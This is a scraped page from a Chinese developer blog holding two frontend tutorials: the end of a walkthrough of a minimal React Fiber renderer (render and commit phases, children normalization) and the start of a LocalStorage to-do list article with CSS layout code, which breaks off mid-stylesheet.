<li>domUtils.js</li>
</ol>
<ul>
<li><strong>createDom()</strong> : 创建真实 DOM 节点</li>
</ul>

<ul>
<li><strong>updateProperties()</strong> : 更新 DOM 属性</li>
</ul>

<ul>
<li><strong>appendDomToRootContainer()</strong> : DOM 挂载逻辑</li>
</ul>

<pre><code class="hljs language-diff" lang="diff">功能概览：
<span class="hljs-deletion">- 本文件包含与真实 DOM 操作相关的纯工具函数，负责在 render/commit 阶段处理 DOM 的创建、属性更新与父容器挂载逻辑。</span>
<span class="hljs-deletion">- 把这些与副作用相关的细节抽象到独立模块，能使主渲染逻辑更简洁且更容易测试。</span>
约束与说明：
<span class="hljs-deletion">- 这些函数会直接操作浏览器 DOM，因此它们的副作用应只在 commit 阶段执行。</span>
<span class="hljs-deletion">- updateProperties 非常基础：仅直接把 props 的字段（非 children）赋值到元素上，未做差分、事件绑定处理或样式合并（这些为后续功能）。</span>
</code></pre>
<p>JavaScript</p>
<ol start="5">
<li>childrenUtils.js</li>
</ol>
<ul>
<li><strong>normalizeChildren()</strong> : 规范化 children 数组</li>
</ul>

<ul>
<li>处理各种输入类型（undefined、单值、数组）</li>
</ul>

<ul>
<li>扁平化嵌套数组</li>
</ul>

<ul>
<li>将文本节点转换为 TEXT_ELEMENT 结构</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript">功能：规范化 children 列表，返回一个扁平化且统一结构的 children 数组（便于后续构建 fiber）
这个工具做了下列工作：
<span class="hljs-number">1</span>) 接受各种可能的 children 输入形态：
   - <span class="hljs-literal">undefined</span> / <span class="hljs-literal">null</span>
   - 单个节点对象（<span class="hljs-title class_">VNode</span>）
   - 单个原始值（<span class="hljs-built_in">string</span> / <span class="hljs-built_in">number</span>）
   - 数组（可能嵌套）
<span class="hljs-number">2</span>) 将 children 规范成一个扁平数组，移除 <span class="hljs-literal">null</span>/<span class="hljs-literal">undefined</span>
<span class="hljs-number">3</span>) 将原始文本（<span class="hljs-built_in">string</span> / <span class="hljs-built_in">number</span>）转换为一个统一的 <span class="hljs-variable constant_">TEXT_ELEMENT</span> 虚拟节点，
   以便后续的 createDom / props 处理一致
返回值：一个标准化的 children 数组（所有项都为 <span class="hljs-title class_">VNode</span> 样式对象，或整体为空数组）
设计注意点：
- 此处没有深度拷贝 children 对象，因此传入的对象引用会保留。
- 对于非常深/大的 children 数组，<span class="hljs-title function_">flat</span>(<span class="hljs-title class_">Infinity</span>) 可能引发性能问题，生产代码中应使用更高效的迭代器或限制层级。
</code></pre>
<p>JavaScript</p>
<h3 data-id="heading-0">整体渲染流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13abf7b537fd4e96b125f0433b927f66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=CNm4qsiK8xN59GOg6Kh7ZB%2BPdW4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">performUnitOfWork 详细流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7340e0c8a65c42b2a6dd1247318ad2a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=KIP70%2FXAWzqhW3JuOZR6MVQklig%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">commitWork 提交流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f8de6f7e4e8495394a12eac66fbe655~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=wAuGacAzcZZZ3oAHyIeSYDzM%2Fro%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">children规范化流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f34ddf26b1f4e22abbbcf76342a30f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=FFEVsapS0i27Eh3N0%2B1AJu0Bzkg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">详细执行流程</h2>
<h3 data-id="heading-5">阶段一：初始化阶段</h3>
<ol>
<li><strong>应用启动</strong></li>
</ol>
<ul>
<li>main.jsx 调用 ReactDom.createRoot(document.getElementById('root'))</li>
</ul>

<ul>
<li>创建根容器，返回包含 render 方法的对象</li>
</ul>
<ol start="2">
<li><strong>开始渲染</strong></li>
</ol>
<ul>
<li>调用 root.render(App)</li>
</ul>

<ul>
<li>触发 React.render(node, container)</li>
</ul>
<ol start="3">
<li><strong>设置根 Fiber</strong></li>
</ol>
<ul>
<li>创建根 Fiber 对象，设置 dom 为容器节点</li>
</ul>

<ul>
<li>props.children 包含要渲染的 App 组件</li>
</ul>

<ul>
<li>设置 nextWorkOfUnit 为根 Fiber</li>
</ul>

<ul>
<li>保存 root 引用用于后续提交</li>
</ul>
<h3 data-id="heading-6">阶段二：调度器启动</h3>
<ol>
<li><strong>工作循环初始化</strong></li>
</ol>
<ul>
<li>window.requestIdleCallback(workLoop) 启动调度</li>
</ul>

<ul>
<li>workLoop 检查浏览器空闲时间</li>
</ul>
<ol start="2">
<li><strong>时间切片处理</strong></li>
</ol>
<ul>
<li>在 deadline.timeRemaining() &gt; 1ms 时持续处理</li>
</ul>

<ul>
<li>每次循环调用 performUnitOfWork(nextWorkOfUnit)</li>
</ul>

<ul>
<li>处理完成后更新 nextWorkOfUnit 为返回的下一个 Fiber</li>
</ul>
<h3 data-id="heading-7">阶段三：Render 阶段（Fiber 树构建）</h3>
<h4 data-id="heading-8">3.1 处理单个 Fiber 单元</h4>
<ol>
<li><strong>Fiber 类型判断</strong></li>
</ol>
<ul>
<li>检查是否为函数组件（typeof fiber.type === 'function'）</li>
</ul>

<ul>
<li>函数组件：执行函数获取返回的 VNode，更新 fiber.props.children</li>
</ul>

<ul>
<li>普通组件：创建 DOM 节点并设置属性</li>
</ul>
<ol start="2">
<li><strong>DOM 节点创建</strong></li>
</ol>
<ul>
<li>调用 createDom(fiber) 创建对应节点</li>
</ul>

<ul>
<li>TEXT_ELEMENT 创建 TextNode，其他创建 Element</li>
</ul>

<ul>
<li>调用 updateProperties 设置 DOM 属性</li>
</ul>
<ol start="3">
<li><strong>子节点规范化</strong></li>
</ol>
<ul>
<li>调用 normalizeChildren(fiber.props.children)</li>
</ul>

<ul>
<li>处理各种 children 输入情况</li>
</ul>

<ul>
<li>扁平化数组，转换文本节点为 TEXT_ELEMENT</li>
</ul>

<ul>
<li>过滤 null/undefined 节点</li>
</ul>
<ol start="4">
<li><strong>构建子 Fiber 链表</strong></li>
</ol>
<ul>
<li>遍历规范化后的 children 数组</li>
</ul>

<ul>
<li>为每个子节点创建对应的 Fiber</li>
</ul>
<ol start="5">
<li/>
</ol>
<ul>
<li>建立 parent-child-sibling 链接关系</li>
</ul>

<ul>
<li>第一个子节点：fiber.child = newFiber</li>
</ul>

<ul>
<li>后续子节点：prevSibling.sibling = newFiber</li>
</ul>
<h4 data-id="heading-9">3.2 深度优先遍历</h4>
<ol>
<li><strong>返回下一个工作单元</strong></li>
</ol>
<ul>
<li>优先返回子节点：if (fiber.child) return fiber.child</li>
</ul>

<ul>
<li>其次返回兄弟节点：if (fiber.sibling) return fiber.sibling</li>
</ul>

<ul>
<li>向上回溯查找父级的兄弟节点</li>
</ul>

<ul>
<li>遍历完成返回 null</li>
</ul>
<h3 data-id="heading-10">阶段四：Commit 阶段（DOM 挂载）</h3>
<h4 data-id="heading-11">4.1 提交准备</h4>
<ul>
<li>当 nextWorkOfUnit 为 null 且 root 存在时</li>
</ul>

<ul>
<li>调用 commitRoot() 进入提交阶段</li>
</ul>
<h4 data-id="heading-12">4.2 递归挂载 DOM</h4>
<ol>
<li><strong>commitWork 执行</strong></li>
</ol>
<ul>
<li>检查当前 Fiber 是否有 DOM 节点</li>
</ul>

<ul>
<li>查找最近的有 DOM 的父节点（跳过函数组件）</li>
</ul>

<ul>
<li>执行 parentFiber.dom.appendChild(fiber.dom)</li>
</ul>
<ol start="2">
<li><strong>深度优先挂载</strong></li>
</ol>
<ul>
<li>先递归挂载子节点：commitWork(fiber.child)</li>
</ul>

<ul>
<li>再递归挂载兄弟节点：commitWork(fiber.sibling)</li>
</ul>
<h4 data-id="heading-13">4.3 完成渲染</h4>
<ul>
<li>所有 DOM 节点挂载完成</li>
</ul>

<ul>
<li>清空 root 引用</li>
</ul>

<ul>
<li>渲染流程结束</li>
</ul>
<h2 data-id="heading-14">四、关键数据结构</h2>
<h3 data-id="heading-15">Fiber 节点结构：</h3>
<p>javascript</p>
<pre><code class="hljs language-yaml" lang="yaml">{
  <span class="hljs-attr">type:</span> <span class="hljs-string">'div'</span> <span class="hljs-string">|</span> <span class="hljs-string">'TEXT_ELEMENT'</span> <span class="hljs-string">|</span> <span class="hljs-string">Function</span>,
  <span class="hljs-attr">props:</span> { <span class="hljs-attr">children:</span> [], <span class="hljs-string">...attributes</span> },
  <span class="hljs-attr">dom:</span> <span class="hljs-string">HTMLElement</span> <span class="hljs-string">|</span> <span class="hljs-string">Text</span>,
  <span class="hljs-attr">parent:</span> <span class="hljs-string">Fiber</span>,
  <span class="hljs-attr">child:</span> <span class="hljs-string">Fiber</span>,
  <span class="hljs-attr">sibling:</span> <span class="hljs-string">Fiber</span>
}
</code></pre>
<p>Plain Text</p>
<h3 data-id="heading-16">虚拟 DOM 结构：</h3>
<p>javascript</p>
<pre><code class="hljs language-css" lang="css">// 元素节点
{ type: <span class="hljs-string">'div'</span>, props: { id: <span class="hljs-string">'app'</span>, children: [...] } }


// 文本节点  
{ type: <span class="hljs-string">'TEXT_ELEMENT'</span>, props: { nodeValue: <span class="hljs-string">'text'</span>, children: [] } }
</code></pre>
<p>Plain Text</p>
<h2 data-id="heading-17">五、总结</h2>
<h3 data-id="heading-18">1. 时间切片调度</h3>
<ul>
<li>使用 requestIdleCallback 避免阻塞主线程</li>
</ul>

<ul>
<li>将渲染任务拆分为多个工作单元</li>
</ul>

<ul>
<li>在浏览器空闲时段执行</li>
</ul>
<h3 data-id="heading-19">2. 阶段分离设计</h3>
<ul>
<li><strong>Render 阶段</strong>：纯计算，构建 Fiber 树，不操作 DOM</li>
</ul>

<ul>
<li><strong>Commit 阶段</strong>：批量 DOM 操作，避免频繁重排重绘</li>
</ul>
<h3 data-id="heading-20">3. 链表数据结构</h3>
<ul>
<li>使用 child、sibling 指针构建树形结构</li>
</ul>

<ul>
<li>支持高效的深度优先遍历</li>
</ul>

<ul>
<li>便于暂停和恢复渲染任务</li>
</ul>
<h3 data-id="heading-21">4. 统一节点处理</h3>
<ul>
<li>所有节点（包括文本）都转换为统一结构</li>
</ul>

<ul>
<li>简化后续处理逻辑</li>
</ul>

<ul>
<li>支持函数组件和普通组件</li>
</ul>
<h3 data-id="heading-22">5. 模块化设计</h3>
<ul>
<li>每个模块职责单一明确</li>
</ul>

<ul>
<li>工具函数独立，便于测试和维护</li>
</ul>

<ul>
<li>清晰的依赖关系和数据流向</li>
</ul>
<h2 data-id="heading-23">六、扩展性考虑</h2>
<p>当前架构为后续功能扩展提供了良好基础，后续需要做这些：</p>
<ul>
<li><strong>Diff 算法</strong>：可在 performUnitOfWork 中实现节点比较</li>
</ul>

<ul>
<li><strong>事件系统</strong>：在 updateProperties 中添加事件处理</li>
</ul>

<ul>
<li><strong>Hooks 支持</strong>：在函数组件处理时维护状态</li>
</ul>

<ul>
<li><strong>错误边界</strong>：添加异常捕获和处理机制React Fiber 渲染器核心逻辑详解</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 0 到 1 实现 LocalStorage 待办清单：CSS 进阶 + 前端工程化思想实践]]></title>    <link>https://juejin.cn/post/7575133880435687475</link>    <guid>https://juejin.cn/post/7575133880435687475</guid>    <pubDate>2025-11-23T02:21:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575133880435687475" data-draft-id="7575083657993732123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 0 到 1 实现 LocalStorage 待办清单：CSS 进阶 + 前端工程化思想实践"/> <meta itemprop="keywords" content="CSS,前端工程化"/> <meta itemprop="datePublished" content="2025-11-23T02:21:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="生椰丝绒拿铁"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 0 到 1 实现 LocalStorage 待办清单：CSS 进阶 + 前端工程化思想实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    生椰丝绒拿铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T02:21:10.000Z" title="Sun Nov 23 2025 02:21:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在前端开发中，LocalStorage 是浏览器提供的核心本地存储方案，而 CSS 布局与工程化编码则是提升开发效率和代码质量的关键。本文将结合实际案例，带大家从零实现一个可持久化的待办清单，同时拆解 CSS 继承 / 弹性布局的核心用法，以及前端函数式封装的工程化思想。</p>
<h2 data-id="heading-0">一、核心知识点预热：先搞懂这 3 个关键技术</h2>
<p>在动手写代码前，我们先梳理案例中涉及的核心技术点，帮大家打通知识盲区：</p>
<h3 data-id="heading-1">1. LocalStorage：浏览器的「永久储物柜」</h3>
<ul>
<li>
<p><strong>存储位置</strong>：浏览器本地，与服务器无关</p>
</li>
<li>
<p><strong>存储特性</strong>：永久存储（除非手动清除或代码删除），页面刷新 / 关闭后数据不丢失</p>
</li>
<li>
<p><strong>存储规则</strong>：仅支持 <code>key-value</code> 键值对，且值必须是字符串（对象 / 数组需用 <code>JSON.stringify()</code> 序列化）</p>
</li>
<li>
<p><strong>核心 API</strong>：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 存数据</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'key'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(数据));
<span class="hljs-comment">// 取数据（需反序列化）</span>
<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'key'</span>));
<span class="hljs-comment">// 删数据（单个/全部）</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'key'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>();
</code></pre>
</li>
</ul>
<h3 data-id="heading-2">2. CSS 关键特性：这些细节能少写 80% 冗余代码</h3>
<h4 data-id="heading-3">（1）继承性：不是所有属性都能「子承父业」</h4>
<ul>
<li>
<p><strong>可继承属性</strong>：<code>font-size</code>、<code>color</code>、<code>text-align</code> 等文本相关属性（子元素自动继承父元素样式）</p>
</li>
<li>
<p><strong>不可继承属性</strong>：<code>background</code>、<code>width</code>、<code>height</code>、<code>border</code> 等布局 / 盒模型相关属性（需手动设置）</p>
</li>
<li>
<p><strong>实用技巧</strong>：用 <code>inherit</code> 强制继承父属性，比如让子元素高度跟随父元素：</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.child</span> {
  <span class="hljs-attribute">height</span>: inherit; <span class="hljs-comment">/* 继承父元素 height */</span>
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-4">（2）outline 与 overflow：细节优化神器</h4>
<ul>
<li><strong>outline</strong>：元素轮廓，类似 <code>border</code> 但不占据盒模型空间（适合表单聚焦样式）</li>
<li><strong>overflow</strong>：控制子元素超出父元素时的表现（<code>hidden</code> 隐藏溢出、<code>auto</code> 自动滚动）</li>
</ul>
<h4 data-id="heading-5">（3）Flex 布局：快速实现居中与对齐</h4>
<p>Flex 是现代布局方案，核心是「格式化上下文」，只需 3 行代码实现元素居中：</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.parent</span> {
  <span class="hljs-attribute">display</span>: flex; <span class="hljs-comment">/* 开启 Flex 布局 */</span>
  <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* 主轴（水平）居中 */</span>
  <span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/* 交叉轴（垂直）居中 */</span>
}
</code></pre>
<h3 data-id="heading-6">3. 前端工程化：拒绝流程式代码，拥抱函数封装</h3>
<p>当代码超过 10 行，就该考虑封装函数！核心优势：</p>
<ul>
<li>复用性：同一逻辑多处调用，减少冗余</li>
<li>可维护性：隐藏实现细节，修改时只需改函数内部</li>
<li>可读性：函数名即功能，代码逻辑更清晰</li>
</ul>
<h2 data-id="heading-7">二、实战：实现 LocalStorage 待办清单</h2>
<h3 data-id="heading-8">1. 项目结构</h3>
<p>plaintext</p>
<pre><code class="hljs language-bash" lang="bash">todo-list/
├── common.css  <span class="hljs-comment"># 样式文件</span>
└── index.html  <span class="hljs-comment"># 结构+逻辑文件</span>
</code></pre>
<h3 data-id="heading-9">2. 样式文件：common.css</h3>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 基础重置：统一盒模型 */</span>
<span class="hljs-selector-tag">html</span> {
  <span class="hljs-attribute">box-sizing</span>: border-box;
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>; <span class="hljs-comment">/* 占满视口高度 */</span>
  <span class="hljs-attribute">display</span>: flex; <span class="hljs-comment">/* 页面整体居中 */</span>
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">text-align</span>: center; <span class="hljs-comment">/* 文本居中 */</span>
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
}

*,
*<span class="hljs-selector-pseudo">::before</span>,
*<span class="hljs-selector-pseudo">::after</span> {
  <span class="hljs-attribute">box-sizing</span>: inherit; <span class="hljs-comment">/* 继承盒模型 */</span>
}

<span class="hljs-comment">/* 容器样式 */</span>
<span class="hljs-selector-class">.wrapper</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">350px</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.95</span>);
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>); <span class="hljs-comment">/* 外发光效果 */</span>
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}

<span class="hljs-selector-tag">h2</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">200</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
}

<span class="hljs-comment">/* 待办列表样式 */</span>
<span class="hljs-selector-class">.plates</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">text-align</span>: left;
  <span class="hljs-attribute">list-style</span>: none;
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">100</span>;
  <span class="hljs-attribute">display</span>: flex; <span class="hljs-comment">/* 复选框与文本同行 */</span>
  <span class="hljs-attribute">align-items</span>: center;
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">label</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>; <span class="hljs-comment">/* 文本占满剩余空间 */</span>
  <span class="hljs-attribute">cursor</span>: pointer; <span class="hljs-comment">/* 鼠标悬浮变指针 */</span>
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#444</span>;
}

<span class="hljs-comment">/* 自定义复选框样式 */</span>
<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">input</span> {
  <span class="hljs-attribute">display</span>: none; <span class="hljs-comment">/* 隐藏原生复选框 */</span>
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">input</span> + <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">"⬜️"</span>;
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
}

<span class="hljs-selector-class">.plates</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span> + <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">"✅"</span>; <span class="hljs-comment">/* 选中时切换图标 */</span>
}

<span class="hljs-comment">/* 表单样式 */</span>
<span class="hljs-selector-class">.add-items</span> {
  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* 输入框与按钮间距 */</span>
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"text"</span>]</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">outline</span>: <span class="hljs-number">3px</span> solid transparent;
  <span class="hljs-attribute">transition</span>: outline <span class="hljs-number">0.3s</span>;
}

<span class="hljs-selector-class">.add-items</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"text"</span>]</span><span class="hljs-selector-pseudo">:focus</span> {
